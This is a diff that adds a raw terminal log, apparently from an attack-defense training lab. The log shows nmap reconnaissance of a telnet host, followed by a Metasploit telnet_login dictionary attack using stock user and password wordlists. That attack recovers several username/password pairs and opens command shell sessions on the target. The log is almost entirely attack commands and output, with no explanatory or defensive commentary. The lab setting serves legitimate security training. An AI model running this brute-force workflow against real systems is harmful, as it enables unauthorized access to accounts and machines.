@@ -1,0 +1,203 @@
+root@attackdefense:~# ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+502: eth0@if503: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:0a:01:01:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 10.1.1.3/24 brd 10.1.1.255 scope global eth0
+       valid_lft forever preferred_lft forever
+505: eth1@if506: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:c0:66:7b:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 192.102.123.2/24 brd 192.102.123.255 scope global eth1
+       valid_lft forever preferred_lft forever
+root@attackdefense:~# ping 192.102.123.3^C
+root@attackdefense:~# ping 192.102.123.3
+PING 192.102.123.3 (192.102.123.3) 56(84) bytes of data.
+64 bytes from 192.102.123.3: icmp_seq=1 ttl=64 time=0.106 ms
+64 bytes from 192.102.123.3: icmp_seq=2 ttl=64 time=0.070 ms
+^C
+--- 192.102.123.3 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 26ms
+rtt min/avg/max/mdev = 0.070/0.088/0.106/0.018 ms
+root@attackdefense:~# nmap -sV -Pn 192.102.123.3
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-29 11:04 UTC
+Nmap scan report for target-1 (192.102.123.3)
+Host is up (0.000014s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+23/tcp open  telnet  Linux telnetd
+MAC Address: 02:42:C0:66:7B:03 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
+root@attackdefense:~# nmap -sV -p- 192.102.123.3
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-29 11:04 UTC
+Nmap scan report for target-1 (192.102.123.3)
+Host is up (0.000014s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE VERSION
+23/tcp open  telnet  Linux telnetd
+MAC Address: 02:42:C0:66:7B:03 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 2.09 seconds
+root@attackdefense:~# service postgresql start
+[ ok ] Starting PostgreSQL 11 database server: main.
+root@attackdefense:~# msfdb init
+System has not been booted with systemd as init system (PID 1). Can't operate.
+Failed to connect to bus: Host is down
+[+] Starting database
+System has not been booted with systemd as init system (PID 1). Can't operate.
+Failed to connect to bus: Host is down
+[i] The database appears to be already configured, skipping initialization
+root@attackdefense:~# msfconsole
+                                                  
+               .;lxO0KXXXK0Oxl:.
+           ,o0WMMMMMMMMMMMMMMMMMMKd,
+        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
+      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
+    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
+   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
+  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
+ oMMMMMMMMMMx.                    dMMMMMMMMMMx
+.WMMMMMMMMM:                       :MMMMMMMMMM,
+xMMMMMMMMMo                         lMMMMMMMMMO
+NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
+MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
+NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
+xMMMMMMMMMd                        ,0MMMMMMMMMMK;
+.WMMMMMMMMMc                         'OMMMMMM0,
+ lMMMMMMMMMMk.                         .kMMO'
+  dMMMMMMMMMMWd'                         ..
+   cWMMMMMMMMMMMNxc'.                ##########
+    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
+      ;0MMMMMMMMMMMMMMMo.          +:+
+        .dNMMMMMMMMMMMMo          +#++:++#+
+           'oOWMMMMMMMMo                +:+
+               .,cdkO0K;        :+:    :+:                                
+                                :::::::+:
+                      Metasploit
+
+       =[ metasploit v5.0.18-dev                          ]
++ -- --=[ 1882 exploits - 1062 auxiliary - 328 post       ]
++ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
+
+msf5 > use auxiliary/scanner/telnet/telnet_version 
+msf5 auxiliary(scanner/telnet/telnet_version) > set RHOSTS 192.102.123.3
+RHOSTS => 192.102.123.3
+msf5 auxiliary(scanner/telnet/telnet_version) > run
+
+[+] 192.102.123.3:23      - 192.102.123.3:23 TELNET Ubuntu 16.04.5 LTS\x0avictim-1 login:
+[*] 192.102.123.3:23      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/telnet/telnet_version) >
+msf5 auxiliary(scanner/telnet/telnet_login) > set RHOSTS 192.102.123.3
+RHOSTS => 192.102.123.3
+msf5 auxiliary(scanner/telnet/telnet_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
+msf5 auxiliary(scanner/telnet/telnet_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/password.lst
+PASS_FILE => /usr/share/metasploit-framework/data/wordlists/password.lst
+msf5 auxiliary(scanner/telnet/telnet_login) > exploit
+
+[-] 192.102.123.3:23      - 192.102.123.3:23 - LOGIN FAILED: sysadmin:!@#$% (Incorrect: )
+[-] 192.102.123.3:23      - 192.102.123.3:23 - LOGIN FAILED: sysadmin:!@#$%^ (Incorrect: )
+[-] 192.102.123.3:23      - 192.102.123.3:23 - LOGIN FAILED: sysadmin:!@#$%^& (Incorrect: )
+[-] 192.102.123.3:23      - 192.102.123.3:23 - LOGIN FAILED: sysadmin:!@#$%^&* (Incorrect: )
+[-] 192.102.123.3:23      - 192.102.123.3:23 - LOGIN FAILED: sysadmin:!boerbul (Incorrect: )
+[-] 192.102.123.3:23      - 192.102.123.3:23 - LOGIN FAILED: sysadmin:!boerseun (Incorrect: )
+^C[*] 192.102.123.3:23      - Caught interrupt from the console...
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/telnet/telnet_login) > show options
+
+Module options (auxiliary/scanner/telnet/telnet_login):
+
+   Name              Current Setting                                                  Required  Description
+   ----              ---------------                                                  --------  -----------
+   BLANK_PASSWORDS   false                                                            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                                                            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                            no        Add all users in the current database to the list
+   PASSWORD                                                                           no        A specific password to authenticate with
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/password.lst      no        File containing passwords, one per line
+   RHOSTS            192.102.123.3                                                    yes       The target address range or CIDR identifier
+   RPORT             23                                                               yes       The target port (TCP)
+   STOP_ON_SUCCESS   false                                                            yes       Stop guessing when a credential works for a host
+   THREADS           1                                                                yes       The number of concurrent threads
+   USERNAME                                                                           no        A specific username to authenticate as
+   USERPASS_FILE                                                                      no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                                                            no        Try the username as the password for all users
+   USER_FILE         /usr/share/metasploit-framework/data/wordlists/common_users.txt  no        File containing usernames, one per line
+   VERBOSE           true                                                             yes       Whether to print output for all attempts
+
+msf5 auxiliary(scanner/telnet/telnet_login) > set VERBOSE false
+VERBOSE => false
+msf5 auxiliary(scanner/telnet/telnet_login) > exploit
+^C
+[*] 192.102.123.3:23      - Caught interrupt from the console...
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/telnet/telnet_login) > show options
+
+Module options (auxiliary/scanner/telnet/telnet_login):
+
+   Name              Current Setting                                                  Required  Description
+   ----              ---------------                                                  --------  -----------
+   BLANK_PASSWORDS   false                                                            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                                                            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                            no        Add all users in the current database to the list
+   PASSWORD                                                                           no        A specific password to authenticate with
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/password.lst      no        File containing passwords, one per line
+   RHOSTS            192.102.123.3                                                    yes       The target address range or CIDR identifier
+   RPORT             23                                                               yes       The target port (TCP)
+   STOP_ON_SUCCESS   false                                                            yes       Stop guessing when a credential works for a host
+   THREADS           1                                                                yes       The number of concurrent threads
+   USERNAME                                                                           no        A specific username to authenticate as
+   USERPASS_FILE                                                                      no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                                                            no        Try the username as the password for all users
+   USER_FILE         /usr/share/metasploit-framework/data/wordlists/common_users.txt  no        File containing usernames, one per line
+   VERBOSE           false                                                            yes       Whether to print output for all attempts
+
+msf5 auxiliary(scanner/telnet/telnet_login) > set STOP_ON_SUCCESS true
+STOP_ON_SUCCESS => true
+msf5 auxiliary(scanner/telnet/telnet_login) > exploit
+
+[+] 192.102.123.3:23      - 192.102.123.3:23 - Login Successful: sysadmin:10sne1
+[*] 192.102.123.3:23      - Attempting to start session 192.102.123.3:23 with sysadmin:10sne1
+[*] Command shell session 1 opened (192.102.123.2:38761 -> 192.102.123.3:23) at 2019-09-29 11:15:33 +0000
+[*] 192.102.123.3:23      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/telnet/telnet_login) > Interrupt: use the 'exit' command to quit
+msf5 auxiliary(scanner/telnet/telnet_login) > set STOP_ON_SUCCESS false
+STOP_ON_SUCCESS => false
+msf5 auxiliary(scanner/telnet/telnet_login) > exploit
+
+[+] 192.102.123.3:23      - 192.102.123.3:23 - Login Successful: sysadmin:10sne1
+[*] 192.102.123.3:23      - Attempting to start session 192.102.123.3:23 with sysadmin:10sne1
+[*] Command shell session 2 opened (192.102.123.2:46043 -> 192.102.123.3:23) at 2019-09-29 11:20:30 +0000
+[+] 192.102.123.3:23      - 192.102.123.3:23 - Login Successful: rooty:!soutpiel
+[*] 192.102.123.3:23      - Attempting to start session 192.102.123.3:23 with rooty:!soutpiel
+[*] Command shell session 3 opened (192.102.123.2:33871 -> 192.102.123.3:23) at 2019-09-29 11:21:07 +0000
+[+] 192.102.123.3:23      - 192.102.123.3:23 - Login Successful: demo:123456789
+[*] 192.102.123.3:23      - Attempting to start session 192.102.123.3:23 with demo:123456789
+[*] Command shell session 4 opened (192.102.123.2:34607 -> 192.102.123.3:23) at 2019-09-29 11:23:39 +0000
+[+] 192.102.123.3:23      - 192.102.123.3:23 - Login Successful: auditor:123qwe
+[*] 192.102.123.3:23      - Attempting to start session 192.102.123.3:23 with auditor:123qwe
+[*] Command shell session 5 opened (192.102.123.2:39717 -> 192.102.123.3:23) at 2019-09-29 11:26:28 +0000
+[+] 192.102.123.3:23      - 192.102.123.3:23 - Login Successful: anon:1234qwer
+[*] 192.102.123.3:23      - Attempting to start session 192.102.123.3:23 with anon:1234qwer
+[*] Command shell session 6 opened (192.102.123.2:35407 -> 192.102.123.3:23) at 2019-09-29 11:29:10 +0000
+[+] 192.102.123.3:23      - 192.102.123.3:23 - Login Successful: administrator:1q2w3e4r
+[*] 192.102.123.3:23      - Attempting to start session 192.102.123.3:23 with administrator:1q2w3e4r
+[*] Command shell session 7 opened (192.102.123.2:42605 -> 192.102.123.3:23) at 2019-09-29 11:33:46 +0000
+[+] 192.102.123.3:23      - 192.102.123.3:23 - Login Successful: diag:21122112
+[*] 192.102.123.3:23      - Attempting to start session 192.102.123.3:23 with diag:21122112
+[*] Command shell session 8 opened (192.102.123.2:43175 -> 192.102.123.3:23) at 2019-09-29 11:39:06 +0000
+[*] 192.102.123.3:23      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/telnet/telnet_login) > 
